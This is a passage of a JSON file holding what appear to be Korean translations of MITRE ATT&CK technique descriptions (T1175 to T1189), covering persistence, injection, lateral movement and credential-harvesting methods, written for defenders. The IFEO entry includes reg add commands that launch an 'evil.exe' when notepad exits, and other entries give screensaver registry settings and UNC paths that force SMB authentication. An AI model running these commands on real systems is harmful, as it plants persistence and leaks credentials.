      "description": "**이 기술은 더 이상 사용되지 않습니다. [분산 구성 요소 개체 모델](https://attack.mitre.org/techniques/T1021/003) 및 [구성 요소 개체 모델](https://attack.mitre.org/techniques/T1559/001)을 사용하시기 바랍니다.**\n\n상대방은 Windows 구성 요소 개체 모델(COM) 및 분산 구성 요소 개체 모델(DCOM)을 사용하여 로컬 코드 실행 또는 측면 이동의 일환으로 원격 시스템에서 실행할 수 있습니다.\n\nCOM은 소프트웨어 객체 간 상호작용을 가능하게 하는 네이티브 Windows 응용 프로그램 프로그래밍 인터페이스(API)의 구성 요소로, 하나 이상의 인터페이스를 구현하는 실행 가능한 코드입니다. (출처: Fireeye Hunting COM June 2019) COM을 통해 클라이언트 객체는 보통 동적 링크 라이브러리(DLL)나 실행 파일(EXE)인 서버 객체의 메서드를 호출할 수 있습니다. (출처: Microsoft COM) DCOM은 원격 프로시저 호출(RPC) 기술을 사용하여 로컬 컴퓨터를 넘어 COM의 기능을 확장하는 투명한 미들웨어입니다. (출처: Microsoft COM)(출처: Fireeye Hunting COM June 2019)\n\n로컬 및 원격 서버 COM 객체와 상호작용할 수 있는 권한은 레지스트리의 액세스 제어 목록(ACL)에 의해 지정됩니다. (출처: Microsoft COM ACL)(출처: Microsoft Process Wide Com Keys)(출처: Microsoft System Wide Com Keys) 기본적으로, 원격에서 COM 객체를 활성화하고 실행할 수 있는 것은 관리자가 유일합니다.\n\n상대방은 COM을 악용하여 로컬 명령 및/또는 페이로드 실행을 수행할 수 있습니다. 다양한 COM 인터페이스가 노출되어 있으며, C, C++, Java, VBScript와 같은 다양한 프로그래밍 언어를 통해 임의의 실행을 호출하는 데 악용될 수 있습니다. (출처: Microsoft COM) 특정 COM 객체는 코드 실행을 넘어 [예약 작업/작업](https://attack.mitre.org/techniques/T1053) 생성, 파일 없는 다운로드/실행 및 권한 상승 및 지속성과 같은 기타 상대방 행동을 직접 수행하는 기능도 존재합니다. (출처: Fireeye Hunting COM June 2019)(출처: ProjectZero File Write EoP Apr 2018)\n\n상대방은 DCOM을 통해 측면 이동을 수행할 수 있습니다. DCOM을 통해 적절한 권한을 가진 사용자 컨텍스트에서 작업하는 상대방은 Office 응용 프로그램 (출처: Enigma Outlook DCOM Lateral Movement Nov 2017)과 불안전한 메서드를 포함하는 기타 Windows 객체를 통해 임의의, 심지어 직접적인 셸코드 실행을 원격으로 얻을 수 있습니다. (출처: Enigma MMC20 COM Jan 2017)(출처: Enigma DCOM Lateral Movement Jan 2017) DCOM은 기존 문서 내의 매크로를 실행할 수 있다. (출처: Enigma Excel DCOM Sept 2017) 그리고 또한 Microsoft Office 응용 프로그램의 COM 생성 인스턴스를 통해 [동적 데이터 교환](https://attack.mitre.org/techniques/T1173)(DDE) 실행을 직접 호출할 수 있으며 (출처: Cyberreason DCOM DDE Lateral Movement Nov 2017), 악성 문서의 필요성을 우회할 수 있습니다.",
      "external_id": "T1175",
      "modified": "2020-03-30T13:36:10.069Z",
      "title": "Component Object Model and Distributed COM",
      "translated": true
    },
    {
      "description": "공격자는 인터넷 브라우저 확장 기능을 악용하여 피해 시스템에 대한 지속적인 접근을 설정할 수 있습니다. 브라우저 확장 프로그램 또는 플러그인은 브라우저의 기능을 추가하고 사용자화할 수 있는 작은 프로그램입니다. 이러한 확장은 직접 설치하거나 브라우저의 앱 스토어를 통해 설치할 수 있으며, 일반적으로 브라우저가 접근할 수 있는 모든 것에 대한 접근 권한을 가지고 있습니다.(인용: 위키백과 브라우저 확장)(인용: 크롬 확장 프로그램 정의)\n\n악성 확장은 정당한 확장 프로그램으로 가장하여 악성 앱 스토어 다운로드를 통해 브라우저에 설치되거나, 소셜 엔지니어링을 통해 또는 이미 시스템이 손상된 공격자에 의해 설치될 수 있습니다. 브라우저 앱 스토어에서 보안이 제한적일 수 있기 때문에 악성 확장이 자동화된 스캐너를 피하는 것은 그리 어렵지 않을 수 있습니다.(인용: 악성 크롬 확장 프로그램 수) 브라우저에 따라 공격자는 확장의 업데이트 URL을 조작하여 공격자가 제어하는 서버에서 업데이트를 설치하거나 모바일 구성 파일을 조작하여 추가 확장을 은밀히 설치할 수 있습니다.\n\nmacOS 11 이전에는 공격자가 <code>profiles</code> 도구를 사용하여 악성 <code>.mobileconfig</code> 파일을 설치하여 브라우저 확장을 은밀히 설치할 수 있었습니다. macOS 11 이상에서는 <code>profiles</code> 도구를 사용하여 구성 프로파일을 설치할 수 없지만, <code>.mobileconfig</code> 파일은 사용자 상호작용을 통해 심는 것이 가능할 수 있습니다.(인용: xorrior 크롬 확장 프로그램 macOS)\n\n확장이 설치되고 나면, 백그라운드에서 웹사이트를 탐색하고 사용자가 브라우저에 입력하는 모든 정보(자격증명 포함)를 탈취하며, 지속성을 위한 RAT의 설치 프로그램으로 사용될 수 있습니다.(인용: 크롬 확장 프로그램 암호화 채굴기)(인용: ICEBRG 크롬 확장 프로그램)(인용: 뱅커 구글 크롬 확장이 자격증명을 탈취)(인용: 캐치 올 크롬 확장 프로그램)\n\n또한 악성 크롬 확장을 통해 지속적인 백도어를 사용하는 봇넷 사례도 있습니다.(인용: Stantinko 봇넷)(인용: 크롬 확장 C2 악성코드) 공격자는 또한 브라우저 확장을 사용하여 브라우저의 권한 및 구성 요소, 개인 정보 설정 및 기타 보안 제어를 수정하여 [방어 회피](https://attack.mitre.org/tactics/TA0005)를 수행할 수 있습니다.(인용: 브라우저 프라이어폭스)(인용: 브라우저 아드로제크)",
      "external_id": "T1176",
      "modified": "2024-09-12T19:48:15.871Z",
      "title": "Browser Extensions",
      "translated": true
    },
    {
      "description": "Windows 보안 서브시스템은 컴퓨터 또는 도메인의 보안 정책을 관리하고 시행하는 여러 구성 요소로 이루어져 있습니다. 로컬 보안 권한(LSA)은 로컬 보안 정책 및 사용자 인증을 담당하는 주요 구성 요소입니다. LSA는 다양한 다른 보안 기능과 관련된 여러 동적 링크 라이브러리(DLL)를 포함하며, 이 모든 DLL은 LSA 서브시스템 서비스(lsass.exe 프로세스) 컨텍스트에서 실행됩니다. (출처: Microsoft Security Subsystem)\n\n공격자는 lsass.exe 드라이버를 타겟하여 실행 및/또는 지속성을 얻으려고 할 수 있습니다. 정당하지 않은 드라이버(예: [DLL 사이드로딩](https://attack.mitre.org/techniques/T1073) 또는 [DLL 검색 순서 하이재킹](https://attack.mitre.org/techniques/T1038))를 교체하거나 추가함으로써, 공격자는 지속적인 LSA 작업에 의해 유발되는 임의의 코드 실행을 달성할 수 있습니다.",
      "external_id": "T1177",
      "modified": "2020-01-24T18:50:28.846Z",
      "title": "LSASS Driver",
      "translated": true
    },
    {
      "description": "윈도우 보안 식별자(SID)는 사용자 또는 그룹 계정을 식별하는 고유한 값입니다. SID는 보안 설명자와 접근 토큰 모두에서 윈도우 보안에 의해 사용됩니다. (출처: Microsoft SID) 계정은 SID-History 액티브 디렉토리 속성에 추가 SID를 보유할 수 있으며 (출처: Microsoft SID-History Attribute), 이를 통해 도메인 간의 상호 운용 가능한 계정 마이그레이션이 가능합니다 (예: SID-History의 모든 값이 접근 토큰에 포함됨).\n\n적대자는 이 메커니즘을 권한 상승에 사용할 수 있습니다. 도메인 관리자(또는 그에 상응하는) 권한을 가지고 수집된 또는 잘 알려진 SID값(출처: Microsoft Well Known SIDs Jun 2017)을 SID-History에 삽입하여 엔터프라이즈 관리자와 같은 임의의 사용자/그룹으로의 가장을 가능하게 할 수 있습니다. 이러한 조작은 로컬 리소스에 대한 접근 승격 또는 [원격 서비스](https://attack.mitre.org/techniques/T1021), [윈도우 관리 공유](https://attack.mitre.org/techniques/T1077) 또는 [윈도우 원격 관리](https://attack.mitre.org/techniques/T1028)와 같은 측면 이동 기술을 통한 접근을 가능하게 할 수 있습니다.",
      "external_id": "T1178",
      "modified": "2020-02-18T18:35:21.493Z",
      "title": "SID-History Injection",
      "translated": true
    },
    {
      "description": "윈도우 프로세스는 재사용 가능한 시스템 리소스를 요구하는 작업을 수행하기 위해 애플리케이션 프로그래밍 인터페이스(API) 기능을 활용하는 경우가 많습니다. 윈도우 API 기능은 일반적으로 동적 링크 라이브러리(DLL)에 내보내기 기능으로 저장됩니다.\n\n후킹(hooking)은 이러한 기능에 대한 호출을 리디렉션하는 것을 포함하며, 다음과 같은 방법으로 구현될 수 있습니다:\n\n* **후크 프로시저(Hook Procedures)**: 메시지, 키 입력 및 마우스 입력과 같은 이벤트에 대한 응답으로 지정된 코드를 가로채고 실행합니다. (출처: Microsoft Hook Overview) (출처: Elastic Process Injection July 2017)\n* **임포트 주소 테이블(IAT) 후킹(Import Address Table Hooking)**: API 기능을 가져오는 포인터가 저장된 프로세스의 IAT를 수정하여 사용합니다. (출처: Elastic Process Injection July 2017) (출처: Adlice Software IAT Hooks Oct 2014) (출처: MWRInfoSecurity Dynamic Hooking 2015)\n* **인라인 후킹(Inline Hooking)**: API 기능의 첫 번째 바이트를 덮어써서 코드 흐름을 리디렉션합니다. (출처: Elastic Process Injection July 2017) (출처: HighTech Bridge Inline Hooking Sept 2011) (출처: MWRInfoSecurity Dynamic Hooking 2015)\n\n[프로세스 주입(Process Injection)](https://attack.mitre.org/techniques/T1055)와 유사하게, 공격자는 후킹을 사용하여 다른 프로세스의 맥락 내에서 악성 코드를 로드하고 실행할 수 있으며, 실행을 은폐하고 해당 프로세스의 메모리에 접근하며, 가능하게는 상승된 권한을 부여할 수 있습니다. 후킹 기법을 설치하면 일반 사용 중 함수가 호출될 때 지속성을 위한 지속적인 호출도 제공할 수 있습니다.\n\n악성 후킹 메커니즘은 크리덴셜 접근(Credential Access)을 위해 사용자 인증 자격 증명을 드러내는 매개변수를 포함하는 API 호출을 포착할 수도 있습니다. (출처: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n\n후킹은 파일, 프로세스, 레지스트리 키 및 기타 객체를 숨기기 위해 [루트킷(Rootkit)](https://attack.mitre.org/techniques/T1014)에서 일반적으로 사용되어 악성 프로그램 및 관련 행동을 감추는 데 사용됩니다. (출처: Symantec Windows Rootkits)",
      "external_id": "T1179",
      "modified": "2020-11-10T18:29:30.516Z",
      "title": "Hooking",
      "translated": true
    },
    {
      "description": "스크린세이버는 사용자가 비활성 상태인 일정 시간 후에 실행되는 프로그램으로, .scr 파일 확장자를 가진 Portable Executable (PE) 파일로 구성되어 있습니다. Windows 스크린세이버 애플리케이션은 <code>C:\\Windows\\System32\\</code> 및 64비트 Windows 시스템에서 <code>C:\\Windows\\sysWOW64\\</code>에 위치하며, 기본 Windows 설치에 포함된 스크린세이버와 함께 설치됩니다.\n\n다음 스크린세이버 설정은 레지스트리에 저장되어 있으며 (<code>HKCU\\Control Panel\\Desktop\\</code>), 이를 조작하여 영속성을 유지할 수 있습니다:\n\n* <code>SCRNSAVE.exe</code> - 악성 PE 경로로 설정\n* <code>ScreenSaveActive</code> - 스크린세이버를 활성화하기 위해 '1'로 설정\n* <code>ScreenSaverIsSecure</code> - 잠금을 해제하기 위해 비밀번호가 필요하지 않게 '0'으로 설정\n* <code>ScreenSaveTimeout</code> - 스크린세이버가 실행되기 전의 사용자 비활성 시간 제한 설정\n\n적대 세력은 사용자 비활성 상태가 일정 시간이 지나면 악성 코드를 실행하기 위해 스크린세이버 설정을 이용하여 영속성을 유지할 수 있습니다.",
      "external_id": "T1180",
      "modified": "2020-01-24T13:51:47.990Z",
      "title": "Screensaver",
      "translated": true
    },
    {
      "description": "윈도우를 생성하기 전에 그래픽 기반의 윈도우 프로세스는 윈도우 클래스에 대한 규정을 따르거나 등록해야 하며, 이는 외관과 행동을 규정합니다(입출력을 처리하는 기능인 윈도우 절차를 통해). (인용: Microsoft Windows Classes) 새로운 윈도우 클래스 등록 시 클래스의 각 인스턴스에 할당된 메모리에 최대 40바이트의 추가 윈도우 메모리(EWM)를 추가 요청할 수 있습니다. 이 EWM은 해당 윈도우에 특화된 데이터를 저장하기 위한 것으로, 값 설정 및 조회를 위한 특정 응용 프로그램 프로그래밍 인터페이스(API) 기능이 있습니다. (인용: Microsoft GetWindowLong function) (인용: Microsoft SetWindowLong function)\n\n작지만 EWM은 32비트 포인터를 저장할 수 있는 충분한 크기를 가지고 있으며, 종종 윈도우 절차를 가리키는 데 사용됩니다. 악성코드는 프로세스 메모리의 공유 섹션에 코드를 작성하고, EWM에 코드에 대한 포인터를 배치한 후, 프로세스의 EWM 주소로 실행 제어를 반환하여 실행을 유도하는 공격 체인의 일부로 이 메모리 위치를 활용할 수 있습니다.\n\nEWM 주입을 통해 부여된 실행은 별도의 라이브 프로세스의 주소 공간에서 발생할 수 있습니다. [프로세스 주입](https://attack.mitre.org/techniques/T1055)과 유사하게, 이는 대상 프로세스의 메모리 접근과 가능한 상승된 권한을 허용할 수 있습니다. 공유 섹션에 페이로드를 작성함으로써 WriteProcessMemory 및 CreateRemoteThread와 같은 고도로 모니터링되는 API 호출의 사용을 피할 수 있습니다. (인용: Elastic Process Injection July 2017) 보다 정교한 악성코드 샘플은 악성 페이로드를 대상 프로세스의 실행 가능한 부분 내에서 재작성할 시스템 기능 및 윈도우 절차의 조합을 유발함으로써 데이터 실행 방지(DEP)와 같은 보호 메커니즘을 우회할 가능성도 있습니다. (인용: MalwareTech Power Loader Aug 2013) (인용: WeLiveSecurity Gapz and Redyms Mar 2013)",
      "external_id": "T1181",
      "modified": "2020-11-10T18:29:30.479Z",
      "title": "Extra Window Memory Injection",
      "translated": true
    },
    {
      "description": "동적 연결 라이브러리(DLL)는 <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> 아래의 AppCertDLLs 레지스트리 키에 지정되어 있으며, CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, 또는 WinExec와 같은 널리 사용되는 애플리케이션 프로그래밍 인터페이스(API) 함수가 호출되는 모든 프로세스에 로드됩니다. (출처: Elastic Process Injection 2017년 7월)\n\n[프로세스 주입](https://attack.mitre.org/techniques/T1055)과 유사하게, 이 값은 악성 DLL이 컴퓨터의 별도 프로세스에서 로드되고 실행되도록 하여 지속성과 권한 상승을 얻는 데 악용될 수 있습니다.",
      "external_id": "T1182",
      "modified": "2020-11-10T18:29:30.350Z",
      "title": "AppCert DLLs",
      "translated": true
    },
    {
      "description": "이미지 파일 실행 옵션(Image File Execution Options, IFEO)은 개발자가 애플리케이션에 디버거를 첨부할 수 있도록 합니다. 프로세스가 생성될 때, 애플리케이션의 IFEO에 존재하는 디버거는 애플리케이션 이름 앞에 붙여져 새 프로세스를 디버거 아래에서 실행하게 됩니다(예: “C:\\dbg\\ntsd.exe -g notepad.exe”). (인용: Microsoft Dev Blog IFEO 2010년 3월)\n\nIFEO는 레지스트리나 GFlags 도구의 글로벌 플래그를 통해 직접 설정할 수 있습니다. (인용: Microsoft GFlags 2017년 3월) IFEO는 레지스트리의 <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> 아래에서 <code>Debugger</code> 값으로 표현되며, 여기서 <code><executable></code>는 디버거가 연결된 바이너리입니다. (인용: Microsoft Dev Blog IFEO 2010년 3월)\n\nIFEO는 또한 지정된 프로그램이 조용히 종료될 때 임의의 모니터 프로그램을 실행되도록 설정할 수도 있습니다(즉, 프로그램이 스스로 조기 종료되거나 두 번째 비 커널 모드 프로세스에 의해 종료되는 경우). (인용: Microsoft Silent Process Exit 2017년 11월) (인용: Oddvar Moe IFEO 2018년 4월) 디버거와 유사하게, 조용한 종료 모니터링은 GFlags를 통해 또는 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>의 IFEO 및 조용한 프로세스 종료 레지스트리 값을 직접 수정하여 활성화할 수 있습니다. (인용: Microsoft Silent Process Exit 2017년 11월) (인용: Oddvar Moe IFEO 2018년 4월)\n\nnotepad.exe가 종료될 때 evil.exe 프로세스가 시작되는 예는 다음과 같습니다: (인용: Oddvar Moe IFEO 2018년 4월)\n\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512</code>\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1</code>\n* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"</code>\n\n[프로세스 주입](https://attack.mitre.org/techniques/T1055)과 유사하게, 이러한 값은 악성 실행 파일이 컴퓨터의 별도 프로세스에서 로드되어 실행되도록 하여 지속성과 권한 상승을 얻는 데 악용될 수 있습니다. (인용: Elastic Process Injection 2017년 7월) IFEO 메커니즘을 설치하면 지속적인 호출을 통해 지속성을 제공할 수 있습니다.\n\n악성 소프트웨어는 또한 방어 회피를 위해 IFEO를 사용하여 다양한 시스템 및 보안 애플리케이션을 리디렉션하고 효과적으로 비활성화하는 잘못된 디버거를 등록할 수 있습니다. (인용: FSecure Hupigon) (인용: Symantec Ushedix 2008년 6월)",
      "external_id": "T1183",
      "modified": "2020-11-10T18:29:30.417Z",
      "title": "Image File Execution Options Injection",
      "translated": true
    },
    {
      "description": "보안 쉘(SSH)은 리눅스 및 macOS 시스템에서 원격 접속의 표준 수단입니다. 이는 사용자가 암호화된 터널을 통해 다른 시스템에 연결할 수 있도록 하며, 일반적으로 패스워드, 인증서 또는 비대칭 암호화 키 쌍을 통해 인증합니다.\n\n악의적인 행위자는 타겟 시스템이 손상된 후 수평 이동을 하기 위해, 활성 SSH 세션에서 공개 키 인증을 통해 다른 시스템과 구축된 신뢰 관계를 악용할 수 있습니다. 이는 기존의 다른 시스템에 대한 연결을 하이재킹하여 발생할 수 있습니다. 이러한 하이재킹은 SSH 에이전트 자체를 손상시키거나 에이전트의 소켓에 접근함으로써 이루어질 수 있습니다. 만약 공격자가 루트 접근 권한을 얻는다면, SSH 세션 하이재킹은 매우 간단할 것입니다. (인용: Slideshare Abusing SSH) (인용: SSHjack Blackhat) (인용: Clockwork SSH Agent Hijacking) SSH 에이전트를 손상시키면 SSH 자격 증명을 가로챌 수 있는 접근 권한도 제공됩니다. (인용: Welivesecurity Ebury SSH)\n\n[SSH 하이재킹](https://attack.mitre.org/techniques/T1184)은 [원격 서비스](https://attack.mitre.org/techniques/T1021)의 사용과 다릅니다. 왜냐하면 새로운 세션을 생성하는 것이 아니라 기존 SSH 세션에 주입하기 때문입니다. 이때 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 사용할 수 있습니다.",
      "external_id": "T1184",
      "modified": "2020-02-25T19:00:50.826Z",
      "title": "SSH Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 보안 취약점과 브라우저 소프트웨어의 고유 기능을 이용하여 콘텐츠를 변경하고, 사용자 행동을 수정하며, 정보 가로채기 등의 다양한 브라우저 세션 하이재킹 기법의 일환으로 정보를 가로챌 수 있습니다.(출처: 위키백과 브라우저의 악성 코드)\n\n구체적인 예로, 공격자가 브라우저에 소프트웨어를 주입하여 사용자의 쿠키, HTTP 세션 및 SSL 클라이언트 인증서를 상속받고, 이를 통해 인증된 인트라넷으로 피벗하는 경우가 있습니다.(출처: Cobalt Strike 브라우저 피벗)(출처: ICEBRG 크롬 확장) 이러한 브라우저 기반의 행동을 실행하기 위해서는 <code>SeDebugPrivilege</code>와 같은 특정 프로세스 권한이 필요하거나 높은 수준의 관리자 권한이 요구될 수 있습니다.\n\n또 다른 예로는 공격자의 브라우저로부터 사용자의 브라우저를 통해 브라우저 트래픽을 피벗하는 방법이 있습니다. 이는 웹 트래픽을 리디렉션하는 프록시를 설정하여 수행됩니다. 이 방식은 사용자 트래픽을 어느 쪽도 변경하지 않으며, 브라우저가 닫히는 즉시 프록시 연결이 종료될 수 있습니다. 공격자는 프록시가 주입된 브라우저 프로세스의 보안 컨텍스트를 가정하게 됩니다. 브라우저는 일반적으로 열려 있는 각 탭에 대해 새로운 프로세스를 생성하며, 권한과 인증서는 accordingly 분리됩니다. 이러한 권한을 통해 공격자는 브라우저를 통해 접근할 수 있는 인트라넷의 모든 자원, 예를 들어 [Sharepoint](https://attack.mitre.org/techniques/T1213/002) 또는 웹메일 등을 찾아볼 수 있습니다. 브라우저 피벗은 2단계 인증이 제공하는 보안을 우회할 수도 있습니다.(출처: Cobalt Strike 매뉴얼)",
      "external_id": "T1185",
      "modified": "2022-02-25T18:58:15.229Z",
      "title": "Browser Session Hijacking",
      "translated": true
    },
    {
      "description": "Windows의 Transactional NTFS (TxF)는 안전한 파일 작업을 수행하는 방법으로 Vista에서 도입되었습니다. (참조: Microsoft TxF) 데이터 무결성을 보장하기 위해 TxF는 동시에 하나의 트랜잭션 핸들만 파일에 쓸 수 있도록 허용합니다. 쓰기 핸들의 트랜잭션이 종료될 때까지 모든 다른 핸들은 작성자로부터 격리되며, 핸들이 열릴 당시 존재했던 커밋된 버전의 파일만 읽을 수 있습니다. (참조: Microsoft Basic TxF Concepts) 손상을 방지하기 위해, TxF는 쓰기 트랜잭션 중 시스템이나 애플리케이션이 실패할 경우 자동 롤백을 수행합니다. (참조: Microsoft Where to use TxF)\n\n비록 더 이상 권장되지 않지만, TxF 애플리케이션 프로그래밍 인터페이스 (API)는 Windows 10에서도 여전히 활성화되어 있습니다. (참조: BlackHat Process Doppelgänging Dec 2017)\n\n적대자는 TxF를 활용하여 파일이 없는 변형의 [프로세스 주입](https://attack.mitre.org/techniques/T1055)인 프로세스 더블갱어링을 수행할 수 있습니다. [프로세스 홀로잉](https://attack.mitre.org/techniques/T1093)과 유사하게, 프로세스 더블갱어링은 합법적인 프로세스의 메모리를 교체하여 방어 및 감지를 피할 수 있는 악성 코드의 은밀한 실행을 가능하게 합니다. TxF를 이용한 프로세스 더블갱어링은 NtUnmapViewOfSection, VirtualProtectEx 및 SetThreadContext와 같은 고도로 모니터링된 API 함수를 사용하지 않도록 합니다. (참조: BlackHat Process Doppelgänging Dec 2017)\n\n프로세스 더블갱어링은 4단계로 구현됩니다. (참조: BlackHat Process Doppelgänging Dec 2017):\n\n* 트랜잭트 (Transact) – 합법적인 실행 파일을 사용하여 TxF 트랜잭션을 생성한 후, 해당 파일을 악성 코드로 덮어씁니다. 이러한 변경 사항은 격리되어 트랜잭션의 맥락 내에서만 보입니다.\n* 로드 (Load) – 메모리의 공유 섹션을 생성하고 악성 실행 파일을 로드합니다.\n* 롤백 (Rollback) – 원래 실행 파일에 대한 변경 사항을 취소하여 사실상 파일 시스템에서 악성 코드를 제거합니다.\n* 애니메이트 (Animate) – 오염된 메모리 섹션에서 프로세스를 생성하고 실행을 시작합니다.",
      "external_id": "T1186",
      "modified": "2020-01-14T17:23:25.111Z",
      "title": "Process Doppelgänging",
      "translated": true
    },
    {
      "description": "공격자는 사용자가 인증 정보를 자동으로 제공하도록 유도하거나 강요하여 자격 증명 자료를 수집할 수 있습니다. 이러한 메커니즘을 통해 공격자는 정보를 가로챌 수 있습니다.\n\n서버 메시지 블록(SMB) 프로토콜은 리소스 및 파일 공유에 대한 접근을 위해 Windows 네트워크에서 시스템 간 인증 및 통신을 위해 일반적으로 사용됩니다. Windows 시스템이 SMB 리소스에 연결을 시도할 때, 현재 사용자에 대한 인증 정보를 자동으로 시도하고 원격 시스템으로 전송합니다. (출처: Wikipedia 서버 메시지 블록) 이러한 행동은 기업 환경에서 일반적이며, 사용자가 네트워크 리소스에 접근하기 위해 자격 증명을 입력할 필요가 없도록 합니다.\n\n웹 분산 저작 및 버전 관리(WebDAV)는 SMB가 차단되거나 실패할 경우 백업 프로토콜로 Windows 시스템에서 일반적으로 사용됩니다. WebDAV는 HTTP의 확장으로, 일반적으로 TCP 포트 80 및 443을 통해 운영됩니다. (출처: Didier Stevens WebDAV 트래픽) (출처: Microsoft WebDAV 보안 관리)\n\n공격자는 이 행동을 악용하여 강제 SMB/WebDAV 인증을 통해 사용자 계정 해시에 접근할 수 있습니다. 공격자는 스피어 피싱을 통해 사용자가 공격자가 제어하는 외부 서버에 대한 리소스 링크가 포함된 첨부 파일을 보낼 수 있습니다(예: [템플릿 주입](https://attack.mitre.org/techniques/T1221)). 또는 특수 제작된 파일을 권한 있는 계정의 탐색 경로(예: .SCF 파일을 바탕화면에 배치)나 피해자가 접근할 수 있는 공개 공유에 놓을 수 있습니다. 사용자의 시스템이 신뢰할 수 없는 리소스에 접근할 때 인증을 시도하고 사용자의 해시된 자격 증명 정보를 SMB를 통해 공격자가 제어하는 서버로 전송합니다. (출처: GitHub 해시 재킹) 자격 증명 해시에 접근할 경우, 공격자는 오프라인에서 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110)을 통해 평문 자격 증명에 접근할 수 있습니다. (출처: Cylance SMB로 리디렉션)\n\n이러한 공격이 발생할 수 있는 여러 가지 방법이 있습니다. (출처: Osanda NetNTLM 해시 도용) 실제 사례에서 구체적인 예는 다음과 같습니다:\n\n* 문서가 열릴 때 자동으로 로드되는 리소스를 포함하는 스피어 피싱 첨부 파일(예: [템플릿 주입](https://attack.mitre.org/techniques/T1221)). 문서에는 예를 들어 <code>file[:]//[원격 주소]/Normal.dotm</code>와 같은 요청이 포함되어 SMB 요청을 유발할 수 있습니다. (출처: US-CERT APT Energy 2017년 10월)\n* 외부 참조를 가리키는 아이콘 파일 이름이 포함된 수정된 .LNK 또는 .SCF 파일(예: <code>\\\\[원격 주소]\\pic.png</code>)로, 시스템이 아이콘이 렌더링될 때 리소스를 로드하도록 강요하여 반복적으로 자격 증명을 수집할 수 있습니다. (출처: US-CERT APT Energy 2017년 10월)",
      "external_id": "T1187",
      "modified": "2024-10-15T16:33:34.508Z",
      "title": "Forced Authentication",
      "translated": true
    },
    {
      "description": "악의적인 트래픽의 출처를 숨기기 위해 공격자는 여러 개의 프록시를 연결할 수 있습니다. 일반적으로 수비자는 자신의 네트워크에 들어오기 전에 마지막으로 거쳐간 프록시의 트래픽을 식별할 수 있지만, 마지막 홉 프록시 이전의 다른 프록시를 식별할 수 있을지는 확실하지 않습니다. 이 기술은 수비자가 여러 프록시를 통해 악의적인 트래픽을 추적하여 출처를 식별해야 하므로 악의적인 트래픽의 원래 출처를 식별하는 것을 더욱 어렵게 만듭니다.",
      "external_id": "T1188",
      "modified": "2020-03-14T23:25:20.928Z",
      "title": "Multi-hop Proxy",
      "translated": true
    },
    {
      "description": "상대방은 사용자가 일반적인 브라우징 과정에서 웹사이트를 방문함으로써 시스템에 접근할 수 있습니다. 이 기술에서는 사용자의 웹 브라우저가 일반적으로 공격의 대상이 되며, 상대방은 또한 악성 코드를 설치하지 않는 방식으로도 손상된 웹사이트를 활용할 수 있습니다. 예를 들어, 애플리케이션 액세스 토큰을 획득하는 등의 방법입니다.\n\n브라우저에 취약점 코드가 전달되는 여러 가지 방법이 존재합니다. 여기에는 다음과 같은 것들이 포함됩니다:\n\n* 정상 웹사이트가 악성 코드(예: JavaScript, iFrames, 교차 사이트 스크립팅)가 삽입되어 공격당한 경우\n* 공격자가 일반적으로 쓰기가 가능한 클라우드 스토리지 버킷에서 정상 웹사이트에 제공되는 스크립트 파일을 수정하는 경우\n* 정상 광고 제공업체를 통해 악성 광고가 지불되어 제공되는 경우(예: 악성 광고)\n* 웹 애플리케이션 인터페이스를 활용하여 웹 콘텐츠를 표시하거나 방문하는 클라이언트에서 실행되는 스크립트를 포함할 수 있는 다른 종류의 객체를 삽입하는 경우(예: 포럼 게시물, 댓글 및 기타 사용자가 제어할 수 있는 웹 콘텐츠).\n\n종종 상대방이 사용하는 웹사이트는 정부, 특정 산업 또는 지역과 같은 특정 커뮤니티에서 방문하며, 목표는 특정 사용자 또는 공유 관심사에 기반한 사용자 집단을 손상시키는 것입니다. 이러한 유형의 표적 캠페인은 전략적 웹 손상 또는 웨이팅 홀 공격이라고 불립니다. 이와 관련된 여러 가지 알려진 사례가 존재합니다.(출처: Shadowserver Strategic Web Compromise)\n\n일반적인 드라이브 바이 손상 과정은 다음과 같습니다:\n\n1. 사용자가 상대방이 제어하는 콘텐츠를 호스팅하는 웹사이트를 방문합니다.\n2. 스크립트가 자동으로 실행되며, 일반적으로 브라우저와 플러그인의 잠재적으로 취약한 버전을 검색합니다.\n    * 사용자는 스크립팅 또는 활성 웹사이트 구성 요소를 사용하도록 설정하고 경고 대화 상자를 무시함으로써 이 과정에 도움을 줄 수 있습니다.\n3. 취약한 버전을 발견하면, 취약점 코드가 브라우저에 제공됩니다.\n4. 만약 공격이 성공하면, 추가적인 보호 장치가 없을 경우 상대방은 사용자의 시스템에서 코드 실행 권한을 가지게 됩니다.\n    * 어떤 경우에는 첫 번째 스캔 이후에 웹사이트를 두 번째로 방문해야 취약점 코드가 제공되기도 합니다.\n\n공개 서버 애플리케이션을 이용한 공격과는 달리, 이 기술의 초점은 웹사이트 방문 시 클라이언트 엔드포인트에서 소프트웨어를 악용하는 것입니다. 이는 공격자가 DMZ에 있는 외부 시스템이 아닌 내부 네트워크의 시스템에 접근할 수 있게 해줍니다.\n\n상대방은 손상된 웹사이트를 사용하여 사용자를 애플리케이션 액세스 토큰(예: OAuth 토큰)을 훔치기 위해 설계된 악성 애플리케이션으로 안내할 수도 있습니다. 이러한 악성 애플리케이션은 정상 웹사이트의 팝업을 통해 배포된 적이 있습니다.(출처: Volexity OceanLotus Nov 2017)",
      "external_id": "T1189",
      "modified": "2024-10-15T15:55:47.494Z",
      "title": "Drive-by Compromise",
      "translated": true
    },
    {
